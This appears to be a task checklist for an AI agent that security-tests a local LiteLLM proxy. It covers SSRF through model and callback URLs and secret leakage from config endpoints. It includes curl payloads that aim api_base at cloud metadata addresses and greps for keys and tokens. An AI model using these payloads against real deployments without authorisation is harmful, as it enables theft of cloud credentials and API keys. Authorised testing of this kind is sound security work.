# Task: LiteLLM Security Testing — Agent 3 (SSRF & Config Secrets)

## Goal
Find SSRF vulnerabilities via model/callback URL injection and sensitive data exposure in config endpoints.

## Pre-conditions

- [ ] litellm is running: `curl -s -o /dev/null -w "%{http_code}" http://localhost:4000/health/liveliness` → must return 200
- [ ] Master key works: `curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer sk-master-test-1234" http://localhost:4000/models` → must return 200

---

## Phase 1 — Config endpoint secrets exposure

Check if config endpoints leak API keys or provider credentials with master key.

- [ ] `curl -s -H "Authorization: Bearer sk-master-test-1234" http://localhost:4000/get/config` → save to `/tmp/litellm_config.json`
- [ ] Search for secrets: `python3 -c "import json; d=json.load(open('/tmp/litellm_config.json')); print(json.dumps(d, indent=2))" 2>/dev/null | grep -i "key\|secret\|password\|token\|api" | head -20`
- [ ] Try without auth: `curl -s -o /dev/null -w "%{http_code}" http://localhost:4000/get/config` → must be 401
- [ ] Try `/config/yaml`: `curl -s -H "Authorization: Bearer sk-master-test-1234" http://localhost:4000/config/yaml | head -50`
- [ ] Try `/debug/info`: `curl -s http://localhost:4000/debug/info` → record status
- [ ] Try `/settings`: `curl -s -H "Authorization: Bearer sk-master-test-1234" http://localhost:4000/settings` → record status and check for secrets

**Finding if:** any endpoint returns API keys, provider credentials, or internal tokens.

---

## Phase 2 — SSRF via model provider URL

Test if litellm forwards requests to attacker-controlled URLs when adding a custom model.

**Setup a listener first:**
- [ ] Start a local listener: `python3 -m http.server 9999 --bind 127.0.0.1 > /tmp/ssrf_listener.log 2>&1 &`
- [ ] Record listener PID: `echo $!`

**Test SSRF via /model/new:**
- [ ] Add model with internal URL:
  ```bash
  curl -s -X POST http://localhost:4000/model/new \
    -H "Authorization: Bearer sk-master-test-1234" \
    -H "Content-Type: application/json" \
    -d '{
      "model_name": "ssrf-test",
      "litellm_params": {
        "model": "openai/gpt-4",
        "api_base": "http://127.0.0.1:9999/ssrf-test",
        "api_key": "fake-key"
      }
    }' | python3 -m json.tool
  ```
  → Record response status and ID

- [ ] Trigger the model to make a request:
  ```bash
  curl -s -X POST http://localhost:4000/chat/completions \
    -H "Authorization: Bearer sk-master-test-1234" \
    -H "Content-Type: application/json" \
    -d '{"model": "ssrf-test", "messages": [{"role": "user", "content": "hi"}]}' \
    -m 5
  ```

- [ ] Check if listener received the request: `cat /tmp/ssrf_listener.log`
  → **If listener shows a request → SSRF confirmed!**
  → Record exact request headers and path from listener log

**Test SSRF via callback URL:**
- [ ] Configure success callback with internal URL:
  ```bash
  curl -s -X POST http://localhost:4000/config/update \
    -H "Authorization: Bearer sk-master-test-1234" \
    -H "Content-Type: application/json" \
    -d '{"litellm_settings": {"success_callback": ["http://127.0.0.1:9999/callback-hit"]}}' \
    | head -5
  ```
  → Record response (may fail — that's OK, note exact error)

---

## Phase 3 — SSRF via /embeddings or /audio with custom base URL

- [ ] Check if user-supplied `api_base` in request body is forwarded:
  ```bash
  curl -s -X POST http://localhost:4000/embeddings \
    -H "Authorization: Bearer sk-master-test-1234" \
    -H "Content-Type: application/json" \
    -d '{
      "model": "text-embedding-ada-002",
      "input": "test",
      "api_base": "http://127.0.0.1:9999/embedding-ssrf"
    }' -m 5
  ```
  → Check listener: `cat /tmp/ssrf_listener.log`

- [ ] Try same with `base_url` parameter instead of `api_base`
- [ ] Try same with `custom_llm_provider` set to `openai` and `api_base` pointing to listener

---

## Phase 4 — Internal metadata endpoint access via SSRF

If SSRF is confirmed in Phase 2 or 3, test if it can reach cloud metadata:
- [ ] Try AWS metadata: change `api_base` to `http://169.254.169.254/latest/meta-data/`
- [ ] Try GCP metadata: `http://metadata.google.internal/computeMetadata/v1/`
- [ ] Try Azure metadata: `http://169.254.169.254/metadata/instance`
- [ ] **IMPORTANT:** Only record HTTP status codes from the litellm response — do NOT print actual metadata content

---

## Phase 5 — Source code check for SSRF mitigations

- [ ] Check if there is URL validation before making requests:
  ```bash
  grep -rn "api_base\|custom_api\|ssrf\|allowlist\|blocklist\|private.*ip\|127\.\|localhost" \
    /opt/homebrew/lib/python3.11/site-packages/litellm/proxy/ 2>/dev/null \
    | grep -i "valid\|check\|block\|allow\|restrict" | head -10
  ```
- [ ] Check if `api_base` from request body is used directly:
  ```bash
  grep -rn "api_base" /opt/homebrew/lib/python3.11/site-packages/litellm/ \
    2>/dev/null | grep "request\|body\|param\|kwargs" | head -10
  ```

---

## Final Checklist

**SSRF confirmed if:**
- [ ] Listener at 127.0.0.1:9999 received a request after adding custom model
- [ ] OR request body `api_base` is forwarded without validation
- [ ] Source code shows no URL allowlist/blocklist for `api_base`

**Config secrets confirmed if:**
- [ ] Any endpoint returns strings matching `sk-`, `key-`, or known provider key patterns

**Write final verdict:** CONFIRMED / NOT CONFIRMED / NEEDS DEEPER TESTING
**Reason:** ___
